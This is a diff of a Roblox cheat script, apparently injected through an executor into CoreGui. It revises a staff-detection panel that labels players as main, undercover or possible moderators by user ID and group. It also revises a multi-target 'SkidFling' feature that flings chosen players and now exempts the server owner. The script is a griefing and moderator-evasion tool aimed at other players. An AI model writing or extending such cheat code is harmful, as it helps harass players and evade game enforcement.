+local slPossSF, slPossEmpty, slPossHdr = slMakeSection("— POSSIBLE STAFF", theme.PossibleStaff, SL_SECTION_STRIDE, 0.5, 4)
 
 -- Add one player row at the given index inside a ScrollingFrame
 local function slAddRow(sf, idx, nameText, detailText, color)
@@ -4746,13 +5015,13 @@ local function slAddRow(sf, idx, nameText, detailText, color)
     nameLbl.TextSize = 15
     nameLbl.TextXAlignment = Enum.TextXAlignment.Left
     nameLbl.TextTruncate   = Enum.TextTruncate.AtEnd
-    if color == theme.Admin then
+    if color == theme.OneStaff then
         local flint = Instance.new("UIGradient", nameLbl)
         flint.Color = ColorSequence.new({
-            ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 0, 18)),
-            ColorSequenceKeypoint.new(0.45, Color3.fromRGB(255, 55, 75)),
-            ColorSequenceKeypoint.new(0.55, Color3.fromRGB(255, 220, 225)),
-            ColorSequenceKeypoint.new(1, Color3.fromRGB(135, 0, 20)),
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(125, 15, 45)),
+            ColorSequenceKeypoint.new(0.42, Color3.fromRGB(235, 55, 90)),
+            ColorSequenceKeypoint.new(0.52, Color3.fromRGB(255, 225, 235)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(145, 18, 55)),
         })
         task.spawn(function()
             while nameLbl.Parent do
@@ -4795,59 +5064,13 @@ local function slPopulate(entries, sf, emptyLbl, color, hdr, title)
     hdr.Text = title .. " [" .. #entries .. "]"
 end
 
-local function addEntry(scroll, nameText, detailText, accentColor)
-    -- Count existing rows so we can assign a LayoutOrder
-    local count = 0
-    for _, c in ipairs(scroll:GetChildren()) do if c:IsA("Frame") then count = count + 1 end end
-
-    -- Row is sized; UIListLayout handles vertical stacking automatically
-    local row = Instance.new("Frame", scroll)
-    row.BackgroundColor3 = theme.BackgroundTertiary
-    row.Size         = UDim2.new(1, 0, 0, 50)
-    row.LayoutOrder  = count + 1
-    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 8)
-    local rs = Instance.new("UIStroke", row)
-    rs.Color = accentColor
-    rs.Thickness = 1
-    rs.Transparency = 0.7
-
-    -- Colour accent bar on the left
-    local accent = Instance.new("Frame", row)
-    accent.BackgroundColor3 = accentColor
-    accent.Position = UDim2.new(0, 0, 0, 0)
-    accent.Size     = UDim2.new(0, 3, 1, 0)
-    Instance.new("UICorner", accent).CornerRadius = UDim.new(0, 8)
-
-    local nameLbl = Instance.new("TextLabel", row)
-    nameLbl.BackgroundTransparency = 1
-    nameLbl.Position = UDim2.new(0, 12, 0, 5)
-    nameLbl.Size     = UDim2.new(1, -16, 0, 19)
-    nameLbl.Font     = Enum.Font.GothamBold
-    nameLbl.Text     = nameText
-    nameLbl.TextColor3    = theme.TextPrimary
-    nameLbl.TextSize      = 15
-    nameLbl.TextXAlignment = Enum.TextXAlignment.Left
-    nameLbl.TextTruncate  = Enum.TextTruncate.AtEnd
-
-    local detailLbl = Instance.new("TextLabel", row)
-    detailLbl.BackgroundTransparency = 1
-    detailLbl.Position = UDim2.new(0, 12, 0, 27)
-    detailLbl.Size     = UDim2.new(1, -16, 0, 17)
-    detailLbl.Font     = Enum.Font.Gotham
-    detailLbl.Text     = detailText
-    detailLbl.TextColor3    = accentColor
-    detailLbl.TextSize      = 13
-    detailLbl.TextXAlignment = Enum.TextXAlignment.Left
-    detailLbl.TextTruncate  = Enum.TextTruncate.AtEnd
-
-    return count + 1
-end
-
-local function refreshStaffList()
+refreshStaffList = function()
+    slClear(slOneSF)
     slClear(slMainSF)
     slClear(slUndSF)
     slClear(slPossSF)
 
+    local oneStaffEntries = {}
     local mainEntries = {}
     local undEntries  = {}
     local possEntries = {}
@@ -4859,18 +5082,26 @@ local function refreshStaffList()
         local inMain     = #mains > 0
         local inPossible = #possible > 0
         local isU        = isUndercover(p, inMain)
-        local isA        = isAdmin(p)
-        local category   = getPlayerCategory(inMain, isU, inPossible, isA)
+        local is01       = is01Staff(p)
+        local ownerPlayer = isOwner(p)
+        local category   = getPlayerCategory(inMain, isU, inPossible, is01, ownerPlayer)
         if not category then continue end
 
         local nameText = getDisplayName(p) .. " (@" .. p.Name .. ")"
 
-        if category == "admin" then
-            table.insert(mainEntries, {
+        if category == "owner" then
+            table.insert(oneStaffEntries, {
                 name = p.Name,
                 display = nameText,
-                detail = "ADMIN • RED FLINT ACCESS",
-                color = theme.Admin,
+                detail = "👑 SERVER OWNER",
+                color = theme.Owner,
+            })
+        elseif category == "01staff" then
+            table.insert(oneStaffEntries, {
+                name = p.Name,
+                display = nameText,
+                detail = "ADMIN • 01 STAFF",
+                color = theme.OneStaff,
             })
         elseif inMain then
             local mainParts = {}
@@ -4902,9 +5133,10 @@ local function refreshStaffList()
     end
 
     local function sortAlpha(t) table.sort(t, function(a, b) return a.name:lower() < b.name:lower() end) end
-    sortAlpha(mainEntries) sortAlpha(undEntries) sortAlpha(possEntries)
+    sortAlpha(oneStaffEntries) sortAlpha(mainEntries) sortAlpha(undEntries) sortAlpha(possEntries)
 -- xx Subtitles staff list
-    slPopulate(mainEntries, slMainSF, slMainEmpty, theme.Success,       slMainHdr, "— STAFF GROUP [MAIN]")
+    slPopulate(oneStaffEntries, slOneSF, slOneEmpty, theme.OneStaff, slOneHdr, "— 01 STAFF")
+    slPopulate(mainEntries, slMainSF, slMainEmpty, theme.Success, slMainHdr, "— VF STAFF GROUP [MAIN]")
     slPopulate(undEntries,  slUndSF,  slUndEmpty,  theme.Warning,       slUndHdr,  "— UNDERCOVER STAFF [HIGH CHANCE]")
     slPopulate(possEntries, slPossSF, slPossEmpty, theme.PossibleStaff, slPossHdr, "— POSSIBLE STAFF GROUP [LOW CHANCE]")
 end
@@ -4913,23 +5145,7 @@ end
 staffListPage:GetPropertyChangedSignal("Visible"):Connect(function()
     if staffListPage.Visible then pcall(refreshStaffList) end
 end)
-
--- Returns true if a player is relevant to the staff list.
--- Used so we only refresh the list when someone who matters joins or leaves.
-local function isRelevantPlayer(p)
-    if isAdmin(p) then return true end
-    if UNDERCOVER_USERIDS[p.UserId] then return true end
-    for _, gid in ipairs(MAIN_GROUP_IDS) do
-        local ok, inMain = pcall(function() return p:IsInGroup(gid) end)
-        if ok and inMain then return true end
-    end
-    for _, gid in ipairs(POSSIBLE_STAFF_GROUP_IDS) do
-        local ok2, inG = pcall(function() return p:IsInGroup(gid) end)
-        if ok2 and inG then return true end
-    end
-    return false
-end
-
+end)()
 
 -- ======================================================== --
 --  MULTI-TARGET FLING INTEGRATION
@@ -4937,6 +5153,7 @@ end
 do
 SelectedTargets = {}
 SelectedTargets.UserIds = {}
+SelectedTargets.UserIds[2309457259] = nil
 PlayerCheckboxes = {}
 FlingActive = false
 UndergroundFlingEnabled = false
@@ -5090,6 +5307,9 @@ undergroundFlingBtn.MouseButton1Click:Connect(function()
 end)
 
 function SkidFling(TargetPlayer)
+    if isCombatRestricted(localPlayer) or isProtectedTarget(TargetPlayer) then
+        return
+    end
     local Character = localPlayer.Character
     local Humanoid  = Character and Character:FindFirstChildOfClass("Humanoid")
     local RootPart  = Humanoid and Humanoid.RootPart
@@ -5226,7 +5446,7 @@ function RefreshFlingList()
     table.sort(pList, function(a, b) return a.Name:lower() < b.Name:lower() end)
     local yPos = 0
     for _, p in ipairs(pList) do
-        if p ~= localPlayer then
+        if p ~= localPlayer and not isProtectedTarget(p) then
             local entry = Instance.new("Frame", pScroll)
             entry.BackgroundTransparency = 1
             entry.Size = UDim2.new(1, 0, 0, 25)
@@ -5268,6 +5488,17 @@ function RefreshFlingList()
             clicker.ZIndex = 2
 
             clicker.MouseButton1Click:Connect(function()
+                if isProtectedTarget(p) or isCombatRestricted(localPlayer) then
+                    notify(
+                        "FLING",
+                        isProtectedTarget(p)
+                            and "The server owner cannot be selected as a Fling target."
+                            or "Fling is restricted for 01 staff and the server owner.",
+                        4,
+                        "warning"
+                    )
+                    return
+                end
                 if SelectedTargets.UserIds[p.UserId] then
                     SelectedTargets[p.Name] = nil
                     SelectedTargets.UserIds[p.UserId] = nil
@@ -5289,7 +5520,7 @@ end
 
 function ToggleAll(sel)
     for _, p in ipairs(Players:GetPlayers()) do
-        if p ~= localPlayer then
+        if p ~= localPlayer and not isProtectedTarget(p) then
             local data = PlayerCheckboxes[p.Name]
             if data then
                 if sel then
@@ -5308,6 +5539,10 @@ function ToggleAll(sel)
 end
 
 startFlingBtn.MouseButton1Click:Connect(function()
+    if isCombatRestricted(localPlayer) then
+        notify("FLING", "Fling is restricted for 01 staff and the server owner.", 4, "warning")
+        return
+    end
     if FlingActive then return end
     local c = CountSelectedTargets()
     if c == 0 then
@@ -5334,7 +5569,7 @@ startFlingBtn.MouseButton1Click:Connect(function()
             local valid = {}
             for userId in pairs(SelectedTargets.UserIds) do
                 local p = Players:GetPlayerByUserId(userId)
-                if p and p.Parent then
+                if p and p.Parent and not isProtectedTarget(p) then
                     valid[userId] = p
                     SelectedTargets[p.Name] = p
                 end
@@ -5399,7 +5634,8 @@ end)
 end
 
 -- Dragging logic
-local dragState = {
+do
+state.DragState = {
     dragging = false,
     dragInput = nil,
     dragStart = nil,
@@ -5407,35 +5643,36 @@ local dragState = {
 }
 main.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragState.dragging = true
-        dragState.dragStart = input.Position
-        dragState.startPos = main.Position
+        state.DragState.dragging = true
+        state.DragState.dragStart = input.Position
+        state.DragState.startPos = main.Position
     end
 end)
 main.InputChanged:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseMovement then
-        dragState.dragInput = input
+        state.DragState.dragInput = input
     end
 end)
 UserInputService.InputChanged:Connect(function(input)
-    if input == dragState.dragInput and dragState.dragging then
-        local delta = input.Position - dragState.dragStart
+    if input == state.DragState.dragInput and state.DragState.dragging then
+        local delta = input.Position - state.DragState.dragStart
         main.Position = UDim2.new(
-            dragState.startPos.X.Scale,
-            dragState.startPos.X.Offset + delta.X,
-            dragState.startPos.Y.Scale,
-            dragState.startPos.Y.Offset + delta.Y
+            state.DragState.startPos.X.Scale,
+            state.DragState.startPos.X.Offset + delta.X,
+            state.DragState.startPos.Y.Scale,
+            state.DragState.startPos.Y.Offset + delta.Y
         )
     end
 end)
 UserInputService.InputEnded:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragState.dragging = false
+        state.DragState.dragging = false
     end
 end)
+end
 
 -- Toggle Menu visibility
-local function showPremiumIntro()
+function state.ShowPremiumIntro()
     main.Visible = false
 
     local splash = Instance.new("ScreenGui")
@@ -5445,7 +5682,9 @@ local function showPremiumIntro()
     splash.DisplayOrder = 20000
     splash.Parent = CoreGui.RobloxGui
 
-    local backdrop = Instance.new("Frame", splash)
+    local backdrop
+    do
+    backdrop = Instance.new("Frame", splash)
     backdrop.BackgroundColor3 = theme.BackgroundPrimary
     backdrop.BackgroundTransparency = 1
     backdrop.Size = UDim2.new(1, 0, 1, 0)
@@ -5458,6 +5697,9 @@ local function showPremiumIntro()
     backdropGradient.Rotation = 135
     tween(backdrop, {BackgroundTransparency = 0.04}, 0.45)
 
+    end
+
+    do
     local ambient = Instance.new("Frame", splash)
     ambient.BackgroundTransparency = 1
     ambient.Size = UDim2.new(1, 0, 1, 0)
@@ -5504,6 +5746,9 @@ local function showPremiumIntro()
         line.ZIndex = 2
     end
 
+    end
+
+    do
     local scanline = Instance.new("Frame", splash)
     scanline.BackgroundColor3 = theme.AccentSecondary
     scanline.BackgroundTransparency = 0.82
@@ -5515,7 +5760,12 @@ local function showPremiumIntro()
         tween(scanline, {Position = UDim2.new(1, 0, 0, 0)}, 2.7, Enum.EasingStyle.Linear)
     end)
 
-    local card = Instance.new("Frame", splash)
+    end
+
+    local card
+    local cardStroke
+    do
+    card = Instance.new("Frame", splash)
     card.AnchorPoint = Vector2.new(0.5, 0.5)
     card.BackgroundColor3 = theme.BackgroundSecondary
     card.BackgroundTransparency = 0.08
@@ -5523,7 +5773,7 @@ local function showPremiumIntro()
     card.Size = UDim2.new(0, 0, 0, 0)
     card.ZIndex = 10
     Instance.new("UICorner", card).CornerRadius = UDim.new(0, 20)
-    local cardStroke = Instance.new("UIStroke", card)
+    cardStroke = Instance.new("UIStroke", card)
     cardStroke.Color = theme.AccentPrimary
     cardStroke.Thickness = 2
     cardStroke.Transparency = 1
@@ -5619,6 +5869,9 @@ local function showPremiumIntro()
     topAccent.ZIndex = 12
     tween(topAccent, {Size = UDim2.new(1, -48, 0, 2)}, 0.8, Enum.EasingStyle.Quart)
 
+    end
+
+    do
     local logo = Instance.new("Frame", card)
     logo.BackgroundColor3 = Color3.fromRGB(18, 130, 255)
     logo.BackgroundTransparency = 0.08
@@ -5705,6 +5958,9 @@ local function showPremiumIntro()
         end
     end)
 
+    end
+
+    do
     local ringOne = Instance.new("Frame", card)
     ringOne.BackgroundTransparency = 1
     ringOne.Position = UDim2.new(0, 20, 0.5, -49)
@@ -5763,12 +6019,15 @@ local function showPremiumIntro()
         end
     end)
 
+    end
+
+    do
     local eyebrow = Instance.new("TextLabel", card)
     eyebrow.BackgroundTransparency = 1
     eyebrow.Position = UDim2.new(0, 138, 0, 38)
     eyebrow.Size = UDim2.new(1, -164, 0, 16)
     eyebrow.Font = Enum.Font.GothamMedium
-    eyebrow.Text = "PRIVATE BUILD  /  EXECUTION SEQUENCE"
+    eyebrow.Text = "01 // SECURE SYSTEM  /  INITIALIZING"
     eyebrow.TextColor3 = theme.TextSecondary
     eyebrow.TextSize = 10
     eyebrow.TextTransparency = 1
@@ -5781,7 +6040,7 @@ local function showPremiumIntro()
     title.Position = UDim2.new(0, 136, 0, 54)
     title.Size = UDim2.new(1, -160, 0, 38)
     title.Font = Enum.Font.GothamBlack
-    title.Text = "VF STAFF ALERT"
+    title.Text = "01 STAFF INTELLIGENCE"
     title.TextColor3 = Color3.fromRGB(105, 225, 255)
     title.TextSize = 31
     title.TextStrokeColor3 = Color3.fromRGB(20, 35, 110)
@@ -5813,7 +6072,7 @@ local function showPremiumIntro()
     edition.Position = UDim2.new(0, 138, 0, 96)
     edition.Size = UDim2.new(1, -164, 0, 24)
     edition.Font = Enum.Font.GothamBold
-    edition.Text = "PREMIUM EDITION"
+    edition.Text = "01 PREMIUM CORE"
     edition.TextColor3 = Color3.fromRGB(255, 235, 55)
     edition.TextSize = 16
     edition.TextStrokeColor3 = Color3.fromRGB(120, 75, 0)
@@ -5915,6 +6174,8 @@ local function showPremiumIntro()
     status.TextXAlignment = Enum.TextXAlignment.Left
     status.ZIndex = 12
 
+    end
+
     task.spawn(function()
         task.wait(1)
         tween(card, {BackgroundTransparency = 1, Size = UDim2.new(0, 560, 0, 248)}, 0.45, Enum.EasingStyle.Quad)
@@ -5990,7 +6251,7 @@ end)
 
 task.spawn(function()
     task.wait(1)
-    showPremiumIntro()
+    state.ShowPremiumIntro()
     notify(
         "STAFF ALERT STARTED",
         (theme.ToggleKey and theme.ToggleKey.Name or "NONE") .. " to toggle menu | "
